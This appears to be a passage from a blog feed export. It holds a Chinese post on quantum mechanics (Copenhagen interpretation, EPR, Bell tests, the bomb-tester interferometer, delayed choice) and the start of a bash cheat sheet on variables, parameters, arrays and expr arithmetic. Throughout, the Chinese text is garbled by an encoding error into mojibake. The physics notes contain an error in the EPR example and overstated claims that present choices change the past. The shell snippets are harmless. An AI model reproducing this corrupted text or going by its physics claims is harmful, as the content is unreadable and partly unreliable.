¹è¯ é‡Š</h3><p>å“¥æœ¬å“ˆæ ¹è¯ é‡Šå¹¶ä¸æ˜¯ä¸€å¥—ç‰©ç†å®šå¾‹ï¼Œè€Œæ˜¯ä¸€å¥—ç‰©ç†ç ”ç©¶æ–¹æ³•å’Œå“²å­¦ç«‹åœº</p><ol><li>é‡å­åŠ›å­¦åªæ˜¯å…³äºæµ‹é‡ç»“æœçš„ç§‘å­¦ï¼Œå®ƒå¹¶ä¸ç ”ç©¶æµ‹é‡ç»“æœèƒŒåçš„â€çœŸç›¸â€œåˆ°åº•æ˜¯ä»€ä¹ˆã€‚</li><li>æ³¢å‡½æ•°åªæ˜¯ä¸€ä¸ªæå†™æ¦‚ç‡çš„æ•°å­¦å½¢å¼ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç‰©ç†å®åœ¨ã€‚</li><li>æ—¢ç„¶æ³¢å‡½æ•°æ ¹æœ¬ä¸æ˜¯ç‰©ç†å®åœ¨ï¼Œé‚£ä¹ˆä¹Ÿå°±è°ˆä¸ä¸Šâ€åç¼©â€œï¼Œæ‰€è°“çš„åç¼©ä¹Ÿå°±æ˜¯æµ‹é‡å‰åçš„æ•°å­¦ä¿¡æ¯å˜åŒ–è€Œå·²ã€‚</li><li>æ³¢å‡½æ•°å°±æ˜¯æˆ‘ä»¬æ‰€èƒ½çŸ¥é“çš„å…¨éƒ¨ä¿¡æ¯ã€‚</li><li>ä¸ºä»€ä¹ˆæ—¥å¸¸ç”Ÿæ´»ä¸­çš„ä¸œè¥¿æ²¡æœ‰è¡¨ç°å‡ºé‡å­åŠ›å­¦çš„æ•ˆåº”ï¼Ÿå› ä¸ºå®è§‚æ˜¯ä¼—å¤šç²’å­çš„é›†ä½“è¡Œä¸ºã€‚</li></ol><h3 id="çˆ±å› æ–¯å¦çš„æœ€åä¸€æˆ˜"><a href="#çˆ±å› æ–¯å¦çš„æœ€åä¸€æˆ˜" class="headerlink" title="çˆ±å› æ–¯å¦çš„æœ€åä¸€æˆ˜"></a>çˆ±å› æ–¯å¦çš„æœ€åä¸€æˆ˜</h3><p>1935å¹´ï¼Œçˆ±å› æ–¯å¦å¯¹é‡å­åŠ›å­¦å‘å‡ºæœ€åä¸€å‡»ã€‚æ˜¯ä¸€ä¸ªæ€æƒ³å®éªŒï¼Œäººä»¬ç§°ä¸ºâ€EPRä½¯è°¬â€œã€‚</p><p>è¿™ä¸ªæ€æƒ³å®éªŒæ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>Aå’ŒBä¸¤ä¸ªå…¨åŒç²’å­ï¼Œå®ƒä»¬æœ¬æ¥æ˜¯åœ¨ä¸€èµ·çš„ï¼Œç„¶åå› ä¸ºåŸå­æ ¸è¡°å˜åˆ†å¼€äº†ï¼Œç„¶åå®ƒä»¬æ²¿ç€ç›´çº¿å„è‡ªå¾€ç›¸åçš„æ–¹å‘é£è¡Œã€‚<br>æ ¹æ®åŠ¨é‡å®ˆæ’ï¼ŒAå’ŒBçš„åŠ¨é‡å¿…å®šæ˜¯äº’ä¸ºç›¸åæ•°ï¼Œè€Œä¸”Aèµ°å¤šè¿œï¼ŒBä¹Ÿä¸€å®šèµ°å¤šè¿œã€‚<br>é‚£ä¹ˆæˆ‘åªè¦æµ‹é‡ä¸€ä¸‹Açš„ä½ç½®æ˜¯xï¼Œå°±çŸ¥é“äº†Bçš„ä½ç½®æ˜¯-xã€‚<br>æˆ‘å†æµ‹é‡Bçš„åŠ¨é‡æ˜¯-pï¼Œé‚£ä¹ˆAçš„åŠ¨é‡å°±æ˜¯-p<br>è¿™æ ·çš„è¯æˆ‘å°±åªå¯¹ä¸€ä¸ªç²’å­æµ‹é‡äº†ä¸€æ¬¡ï¼Œä½†æ˜¯å´åŒæ—¶çŸ¥é“äº†å®ƒçš„ä½ç½®å’ŒåŠ¨é‡ï¼Œè¿åäº†æµ·æ£®å ¡ä¸ç¡®å®šæ€§åŸç†ã€‚</p></blockquote><p>çˆ±å› æ–¯å¦è¿™ä¸ªæ€æƒ³å®éªŒçš„æ‰€æœ‰æµ‹é‡éƒ½æ˜¯åˆæ³•çš„ï¼Œæ²¡æœ‰çŠ¯ä»»ä½•é”™è¯¯ã€‚æ³¢å°”é˜µè¥å¯¹æ­¤åªèƒ½ç»™å‡ºä¸€ä¸ªåé©³ï¼š</p><p>Aå’ŒBä¸¤ä¸ªç²’å­åº”è¯¥è¢«è§†ä¸ºåŒä¸€ä¸ªé‡å­ç³»ç»Ÿï¼Œç”¨ä¸€ä¸ªæ³¢å‡½æ•°æ¥æå†™ã€‚å½“æµ‹é‡Aä½ç½®çš„æ—¶å€™ï¼Œå°±ç›¸å½“äºæµ‹äº†Bçš„ä½ç½®ï¼Œä»è€Œç ´åäº†Bçš„åŠ¨é‡ã€‚</p><p>è¿™ä¸€æ¬¡çˆ±å› æ–¯å¦æ²¡æœ‰æ¥å—ï¼Œè¯´ï¼Œæˆ‘è¿™ä¸¤ä¸ªç²’å­å¯ä»¥è·ç¦»å‡ å…‰å¹´è¿œå†æµ‹é‡ï¼Œå¦‚æœæµ‹é‡Açš„åŒæ—¶å°±ç ´åäº†Bçš„åŠ¨é‡ï¼Œè¿™éš¾é“ä¸æ˜¯<strong>é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨</strong>å—ï¼Ÿ</p><p>å¯¹æ­¤æ³¢å°”æ— è¨€ä»¥å¯¹ï¼Œæ³¢å°”çš„å”¯ä¸€åˆç†åé©³å°±æ˜¯é‡å­ç³»ç»ŸçœŸçš„æœ‰é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨ã€‚</p><p><strong>é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨ï¼Œä»æ­¤æˆä¸ºäº†é‡å­åŠ›å­¦çš„å‘½é—¨</strong></p><h3 id="é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨"><a href="#é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨" class="headerlink" title="é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨"></a>é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨</h3><p>è´å°”åœ¨1964å¹´æå‡ºäº†å¯è¯ä¼ªçš„å®éªŒç†è®ºè®¾æƒ³ï¼šå…¶ä¸­çš„å…³é”®ç»“è®ºæ˜¯æµ‹é‡ä¸¤ç«¯çš„ç»“æœæ»¡è¶³â€4% &gt; 1% + 1%â€œè¿™æ ·çš„ä¸ç­‰å¼ï¼Œå¦‚æœæ»¡è¶³ï¼Œé‚£ä¹ˆæ³¢å°”æ˜¯å¯¹çš„ï¼›ä¸æ»¡è¶³ï¼Œçˆ±å› æ–¯å¦æ˜¯å¯¹çš„ã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/f6cfe3f7150c3746d309dfeecff898b.jpg" alt="Alt text| center| 300*0"><br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/59ea0217eeb68158caf0617fbe892bf.jpg" alt="Alt text | center | 300*0"></p><p>æœ€åå®éªŒè¯æ˜ï¼Œæ³¢å°”æ˜¯æ­£ç¡®çš„ï¼ŒçœŸçš„æœ‰é¬¼é­…èˆ¬çš„è¶…è·ä½œç”¨ï¼Œæ˜¯ä¸¤ä¸ªç²’å­ä¹‹é—´å‘ç”Ÿçš„åè°ƒï¼Œè¿™å°±æ˜¯<strong>é‡å­çº ç¼ </strong>ã€‚</p><ol><li>ç²’å­çš„æŸä¸ªå±æ€§ï¼Œæ¯”å¦‚è‡ªæ—‹ï¼Œæ˜¯åœ¨è¢«è§‚æµ‹çš„é‚£ä¸€åˆ¹é‚£æ‰ç¡®å®šä¸‹æ¥çš„ã€‚è€Œä¸æ˜¯æå‰è®¾ç½®å¥½çš„ã€‚</li><li>é‡å­çº ç¼ æ˜¯å‘ç”Ÿåœ¨ä¸¤ä¸ªç²’å­ä¹‹é—´çš„ã€‚</li><li>é‡å­çº ç¼ è™½ç„¶æ˜¯çœŸçš„ï¼Œä½†æ˜¯ä¸èƒ½ç”¨æ¥ä¼ é€’ä¿¡æ¯ã€‚</li></ol><h3 id="æ³¢å‡½æ•°çš„ç©ºé—´æ„ŸçŸ¥è¶…èƒ½åŠ›"><a href="#æ³¢å‡½æ•°çš„ç©ºé—´æ„ŸçŸ¥è¶…èƒ½åŠ›" class="headerlink" title="æ³¢å‡½æ•°çš„ç©ºé—´æ„ŸçŸ¥è¶…èƒ½åŠ›"></a>æ³¢å‡½æ•°çš„ç©ºé—´æ„ŸçŸ¥è¶…èƒ½åŠ›</h3><p>æœ‰è¿™ä¹ˆä¸€ä¸ªå®éªŒï¼Œå®éªŒè£…ç½®å¦‚ä¸‹ï¼š</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/543f5e38435fbbe4689bf1d44d992d8.jpg" alt="Alt text | center | 500 *0"></p><p>ç”¨æ³¢çš„è§†è§’æ¥çœ‹å…‰ï¼Œæœ€ååªä¼šåœ¨æ¢æµ‹å™¨2ä¸Šæ¥å—åˆ°å…‰ï¼Œå› ä¸ºæ³¢çš„å¹²æ¶‰åŸç†ï¼Œè¿™é‡Œæ˜¯ç»å…¸ç‰©ç†å­¦èŒƒç•´ã€‚</p><p>ç°åœ¨ä»¥ç²’å­çš„è§†è§’æ¥çœ‹çœ‹ï¼Œæ¯æ¬¡åªå‘å°„ä¸€ä¸ªå…‰å­ï¼Œé‚£ä¹ˆä¼šå‡ºç°æƒ…å†µå‘¢ï¼Ÿ<br>å…‰å­æ¯ä¸€æ¬¡é€šè¿‡åˆ†æŸå™¨éƒ½æœ‰ä¸€åŠçš„æ¦‚ç‡è¢«åå°„æˆ–è€…é€è¿‡ã€‚é‚£ä¹ˆæ˜¯ä¸æ˜¯è¯´æ¢æµ‹å™¨1å°±æœ‰ä¸€åŠçš„å‡ ç‡æ¥å—åˆ°è¿™ä¸ªå…‰å­ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ä¸å¯¹ï¼Œè¿™æ˜¯å› ä¸ºå…‰å­ä¼š<strong>åŒæ—¶</strong>èµ°è¿‡ä¸¤æ¡è·¯å¾„ï¼Œåœ¨åˆ†æŸå™¨2çš„æ—¶å€™ï¼Œå…‰å­ä¼šè‡ªå·±ä¸è‡ªå·±å‘ç”Ÿå¹²æ¶‰ï¼ŒæŠµæ¶ˆæ‰å»å¾€æ¢æµ‹å™¨1çš„å…‰å­ã€‚å®éªŒç»“æœä¸ç»å…¸ç‰©ç†å­¦ä¸€æ ·ã€‚ è¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</p><blockquote><p>å…‰å­åœ¨å‡ºå‘å‰çš„é‚£ä¸€åˆ¹é‚£ï¼Œå®ƒçš„æ³¢å‡½æ•°ï¼Œå°±å¯¹æ‰€æœ‰çš„è·¯å¾„ã€å¹²æ¶‰ä»ªå…¨å±€çš„è®¾ç½®ï¼Œæœ‰ä¸€ä¸ªæ€»ä½“æ„ŸçŸ¥ã€‚æ˜¯è¿™ä¸ªâ€<strong>æ€»ä½“æ„ŸçŸ¥</strong>â€œå‘Šè¯‰å…‰å­åº”è¯¥å¦‚ä½•è¿åŠ¨ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å…‰å­å³èµ°äº†è·¯å¾„1ï¼Œä¹Ÿèµ°äº†è·¯å¾„2ï¼Œè¿™ä¸ªå…‰å­å¤„äºä¸¤æ¡è·¯å¾„çš„â€œé‡å­å åŠ æ€â€ã€‚</p></blockquote><p>ç¬¬äºŒä¸ªå®éªŒæ˜¯æ¢æµ‹ç‚¸å¼¹å®éªŒï¼Œé—®å¦‚ä½•ç”¨å…‰å­¦çš„æ–¹æ³•æ¢æµ‹æ˜¯å¦æœ‰ç‚¸å¼¹ã€‚è¿™ä¸ªç‚¸å¼¹æ— æ¯”æ•æ„Ÿï¼Œå¯¹ä¸€ä¸ªå…‰å­å°±ä¼šå‘ç”Ÿçˆ†ç‚¸ã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/01177690293872659e441e2be78b309.jpg" alt="Alt text | center | 500*0"></p><p>é€šè¿‡å®éªŒå¯ä»¥å‘ç°ï¼Œæœ‰1/4çš„æ¦‚ç‡ï¼Œæ¢æµ‹å™¨1ä¼šæ”¶åˆ°å…‰å­ã€‚é‚£ä¹ˆåªè¦4æ¬¡é‡Œé¢æœ‰ä¸€æ¬¡åœ¨æ¢æµ‹å™¨1ä¸Šæ”¶åˆ°äº†å…‰å­ï¼Œé‚£ä¹ˆç‚¸å¼¹ä¸€å®šå­˜åœ¨ã€‚ï¼ˆçœŸå®å®éªŒä¸­ï¼Œå¯ä»¥é€šè¿‡å¾®è°ƒï¼Œå°†æ¦‚ç‡æ— é™æ¥è¿‘äº1ï¼‰</p><p>ä¸ºä»€ä¹ˆä¼šåœ¨æ¢æµ‹å™¨1ä¸Šæ”¶åˆ°å…‰å­å‘¢ï¼Ÿå› ä¸ºå…‰å­åœ¨å‡ºå‘çš„ä¸€ç¬é—´å°±çŸ¥é“è·¯å¾„2è¢«é˜»æ–­äº†ï¼Œæ— æ³•ä¸è‡ªå·±å¹²æ¶‰ï¼Œæ‰€ä»¥åœ¨ä¼šå‡ºç°åœ¨æ¢æµ‹å™¨1ä¸Šã€‚ä¹Ÿå°±äº‹è¯´å…‰å­åœ¨å»åˆ°åˆ†æŸå™¨1çš„æ—¶å€™ï¼Œå°±å‘ç”Ÿäº†åç¼©ï¼Œè€Œå¯¼è‡´åªæœ‰è·¯å¾„1å¯ä»¥è¢«é€‰æ‹©ã€‚</p><p>è¿™æ ·ï¼Œå°±åšåˆ°äº†ç»å…¸ç‰©ç†ä¸­æ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•å®Œæˆçš„æ¢æµ‹ç‚¸å¼¹çš„äº‹ã€‚<strong>é‡å­åŠ›å­¦å¯ä»¥ä¼ é€’å‡ºç»å…¸ç‰©ç†ç¦æ­¢ä¼ é€’çš„ä¿¡æ¯</strong>ã€‚</p><blockquote><p>å…‰å­è¦æœ‰ç²’å­æ€§ï¼Œæ³¢å‡½æ•°è¦æœ‰æ„ŸçŸ¥èƒ½åŠ›ï¼Œè¿™ä¸¤ä¸ªæ¡ä»¶åŠ èµ·æ¥æ‰å«åšé‡å­åŠ›å­¦ã€‚</p></blockquote><h3 id="æ³¢å‡½æ•°çš„æ—¶é—´æ„ŸçŸ¥èƒ½åŠ›"><a href="#æ³¢å‡½æ•°çš„æ—¶é—´æ„ŸçŸ¥èƒ½åŠ›" class="headerlink" title="æ³¢å‡½æ•°çš„æ—¶é—´æ„ŸçŸ¥èƒ½åŠ›"></a>æ³¢å‡½æ•°çš„æ—¶é—´æ„ŸçŸ¥èƒ½åŠ›</h3><p>æœ‰è¿™ä¹ˆä¸€ä¸ªå®éªŒï¼Œå®éªŒè£…ç½®å¦‚ä¸‹ï¼š</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ec47544409c42535bb276ed24b0738d.jpg" alt="Alt text| center | 500*0"></p><p>D1 å’Œ D2 æ˜¯æµ‹é‡å…‰å­ç²’å­æ€§çš„è§‚æµ‹å™¨ï¼Œè€Œå¯ç§»åŠ¨çš„å±å¹•å¯ä»¥ç†è§£ä¸ºæµ‹é‡å…‰å­æ³¢åŠ¨æ€§çš„è§‚æµ‹å™¨ã€‚å½“ç”¨å¯ç§»åŠ¨çš„å±å¹•æŒ¡ä½D1å’ŒD2çš„æ—¶å€™ï¼Œå…‰å­è¡¨ç°å‡ºæ¥çš„æ˜¯æ³¢çš„ç‰¹æ€§ï¼Œæœ‰å¹²æ¶‰æ¡çº¹ã€‚è€Œæ‹¿æ‰å±å¹•ï¼Œç”¨D1å’ŒD2ä½œä¸ºè§‚æµ‹çš„æ—¶å€™ï¼Œä¸ä¼šå‘ç”Ÿå¹²æ¶‰ï¼Œä¼šæ¥æ”¶åˆ°æ¯ä¸€ä¸ªå…‰å­ï¼Œè¡¨ç°å‡ºæ¥çš„æ˜¯ç²’å­æ€§ã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/b13faead4f0ba2aa96fe072d215ee51.png" alt="Alt text | center | 500*0"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ æƒ³æµ‹é‡å…‰å­çš„æ³¢åŠ¨æ€§ï¼Œé‚£ä¹ˆå…‰å­å°±ä¼šè¡¨ç°å‡ºæ³¢çš„ç‰¹æ€§ã€‚å¦‚æœä½ æƒ³æµ‹é‡å…‰å­çš„ç²’å­æ€§ï¼Œé‚£ä¹ˆå…‰å­å°±ä¼šè¡¨ç°å‡ºç²’å­æ€§ã€‚<strong>å…‰å­æ˜¯è¡¨ç°æ³¢è¿˜æ˜¯ç²’å­ï¼Œå–å†³äºä½ é—®ä»–ä»€ä¹ˆé—®é¢˜</strong></p><ul><li><strong>æƒ å‹’çš„å»¶è¿Ÿé€‰æ‹©</strong></li></ul><p>ç°åœ¨è¿›ä¸€æ­¥å®éªŒï¼Œå½“æˆ‘ä»¬åœ¨å…‰å­é€šè¿‡åŒç¼ä¹‹åï¼Œå†å†³å®šæ˜¯è§‚å¯Ÿä»€ä¹ˆï¼Œé‚£ä¹ˆå…‰å­ä¼šè¡¨ç°å‡ºæ¥ä»€ä¹ˆæ€§è´¨å‘¢ï¼Ÿ<br>ç­”æ¡ˆæ˜¯ï¼Œè¿˜æ˜¯ä¼šè¡¨ç°å‡ºæƒ³è¦è§‚æµ‹çš„æ€§è´¨ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ç°åœ¨çš„é€‰æ‹©ï¼Œæ”¹å˜äº†è¿‡å»çš„äº‹ä»¶ã€‚</p><p><strong>é‡å­çº ç¼ å®éªŒè¯æ˜æ³¢å‡½æ•°æœ‰è¶…è¶Šæ—¶ç©ºçš„æ„ŸçŸ¥èƒ½åŠ›ï¼Œå»¶è¿Ÿé€‰æ‹©å®éªŒè¯æ˜æ³¢å‡½æ•°æœ‰è¶…è¶Šæ—¶é—´çš„æ„ŸçŸ¥èƒ½åŠ›</strong></p><p>ä½†è¯·æ³¨æ„ï¼Œè¿™ç§è¶…è¶Šæ—¶é—´çš„æ„ŸçŸ¥èƒ½åŠ›åªèƒ½å½±å“ï¼Œä¸èƒ½æ§åˆ¶æ³¢å‡½æ•°ï¼Œæ‰€ä»¥æ²¡æœ‰è¿åç›¸å¯¹è®ºã€‚</p><p class='quest'>å…‰å­åœ¨æµ‹é‡å‰çš„ä¸€ç¬é—´æ”¹å˜äº†æ€§è´¨ï¼Œé‚£ä¼šä¸ä¼šæ˜¯å®ƒåŒæ—¶å¤„äºç²’å­ä¸æ³¢çš„å åŠ æ€ï¼Œç„¶åæµ‹é‡çš„æ—¶å€™åç¼©äº†å‘¢ï¼Ÿ<p class='answer'>å¹¶ä¸æ˜¯ï¼Œå¦‚æœæƒ³è¦è¡¨ç°æ³¢çš„ä¸€é¢ï¼Œé‚£ä¹ˆå°±å¿…é¡»äº†è§£ä¸¤æ¡è·¯å¾„ï¼Œç§¯ç´¯åˆ°ç›¸åº”çš„ç›¸ä½å·®ï¼Œæ‰èƒ½æ­£å¥½å½¢æˆå¹²æ¶‰ï¼›è€Œå¦‚æœæƒ³è¦è¡¨ç°å‡ºç²’å­æ€§ï¼Œå°±å¿…é¡»çœŸçš„èµ°è¿‡ä¸€ä¸ªç¼ï¼Œæ‰èƒ½å½¢æˆæœ‰ç¼çš„ç»Ÿè®¡ç»“æœã€‚å®ƒå¿…é¡»è®°å¾—è·¯ä¸Šçš„æƒ…å†µæ‰è¡Œã€‚å…³é”®ä¸åœ¨äºå®ƒæœ€åçš„åç¼©çš„è¡¨ç°ï¼Œè€Œæ˜¯ä»–å¦‚ä½•çŸ¥é“è·¯å¾„ä¸Šçš„ä¿¡æ¯ï¼Œå®ƒæ˜¯å¦‚ä½•è¿‡æ¥çš„ã€‚]]></content>
      
      
      <categories>
          
          <category> ç§‘å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç‰©ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell é€ŸæŸ¥è¡¨</title>
      <link href="/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">msg=<span class="hljs-string">&quot;hello world&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$msg</span></span></code></pre></div></div><p><strong>å˜é‡åçš„å‘½åé¡»éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š</strong></p><ul><li>å‘½ååªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œé¦–ä¸ªå­—ç¬¦ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚</li><li>ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€‚</li><li>ä¸èƒ½ä½¿ç”¨æ ‡ç‚¹ç¬¦å·ã€‚</li><li>ä¸èƒ½ä½¿ç”¨bashé‡Œçš„å…³é”®å­—ï¼ˆå¯ç”¨helpå‘½ä»¤æŸ¥çœ‹ä¿ç•™å…³é”®å­—ï¼‰ã€‚</li></ul><h2 id="ä¼ å‚"><a href="#ä¼ å‚" class="headerlink" title="ä¼ å‚"></a>ä¼ å‚</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ‰§è¡Œçš„æ–‡ä»¶åï¼š<span class="hljs-variable">$0</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼š<span class="hljs-variable">$1</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸ºï¼š<span class="hljs-variable">$2</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºï¼š<span class="hljs-variable">$3</span>&quot;</span>;</span></code></pre></div></div><p><strong>è„šæœ¬å†…è·å–å‚æ•°çš„æ ¼å¼ä¸ºï¼š</strong></p><p>$nã€‚n ä»£è¡¨ä¸€ä¸ªæ•°å­—ï¼Œ1 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ2 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨â€¦â€¦</p><p><strong>å¦å¤–ï¼Œè¿˜æœ‰å‡ ä¸ªç‰¹æ®Šå­—ç¬¦ç”¨æ¥å¤„ç†å‚æ•°ï¼š</strong></p><table><thead><tr><th align="center">å‚æ•°</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>$#</code></td><td align="left">ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°</td></tr><tr><td align="center"><code>$*</code></td><td align="left">ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ã€‚å¦‚â€$*â€ç”¨ã€Œâ€ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥â€$1 $2 â€¦ $nâ€çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚</td></tr><tr><td align="center"><code>$$</code></td><td align="left">è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·</td></tr><tr><td align="center"><code>$!</code></td><td align="left">åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„IDå·</td></tr><tr><td align="center"><code>$@</code></td><td align="left">ä¸<code>$*</code>ç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨æ—¶åŠ å¼•å·ï¼Œå¹¶åœ¨å¼•å·ä¸­è¿”å›æ¯ä¸ªå‚æ•°ã€‚å¦‚â€$@â€ç”¨ã€Œâ€ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥â€$1â€ â€œ$2â€ â€¦ â€œ$nâ€ çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚</td></tr><tr><td align="center"><code>$-</code></td><td align="left">æ˜¾ç¤ºShellä½¿ç”¨çš„å½“å‰é€‰é¡¹ï¼Œä¸setå‘½ä»¤åŠŸèƒ½ç›¸åŒã€‚</td></tr><tr><td align="center"><code>$?</code></td><td align="left">æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚</td></tr></tbody></table><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">my_array=(A B <span class="hljs-string">&quot;C&quot;</span> D)</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬äºŒä¸ªå…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸‰ä¸ªå…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬å››ä¸ªå…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ•°ç»„çš„å…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ•°ç»„çš„å…ƒç´ ä¸º: <span class="hljs-variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: <span class="hljs-variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: <span class="hljs-variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span></code></pre></div></div><h2 id="åŸºæœ¬è¿ç®—ç¬¦"><a href="#åŸºæœ¬è¿ç®—ç¬¦" class="headerlink" title="åŸºæœ¬è¿ç®—ç¬¦"></a>åŸºæœ¬è¿ç®—ç¬¦</h2><blockquote><p>åŸç”Ÿ bash ä¸æ”¯æŒç®€å•çš„æ•°å­¦è¿ç®—ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–å‘½ä»¤æ¥å®ç°ï¼Œä¾‹å¦‚ awk å’Œ exprï¼Œexpr æœ€å¸¸ç”¨ã€‚</p></blockquote><p>expr æ˜¯ä¸€æ¬¾è¡¨è¾¾å¼è®¡ç®—å·¥å…·ï¼Œä½¿ç”¨å®ƒèƒ½å®Œæˆè¡¨è¾¾å¼çš„æ±‚å€¼æ“ä½œã€‚</p><h3 id="ç®—æ•°è¿ç®—ç¬¦"><a href="#ç®—æ•°è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°è¿ç®—ç¬¦"></a>ç®—æ•°è¿ç®—ç¬¦</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2åŠ 2ç­‰äº&quot;</span>`expr 2 + 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2å‡2ç­‰äº&quot;</span>`expr 2 - 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2ä¹˜2ç­‰äº&quot;</span>`expr 2 \* 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2é™¤2ç­‰äº&quot;</span>`expr 2 / 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2é™¤2å–ä½™&quot;</span>`expr 2 % 2`</span></code></pre></div></div><h3 id="å…³ç³»è¿ç®—ç¬¦"><a href="#å…³ç³»è¿ç®—ç¬¦" class="headerlink" 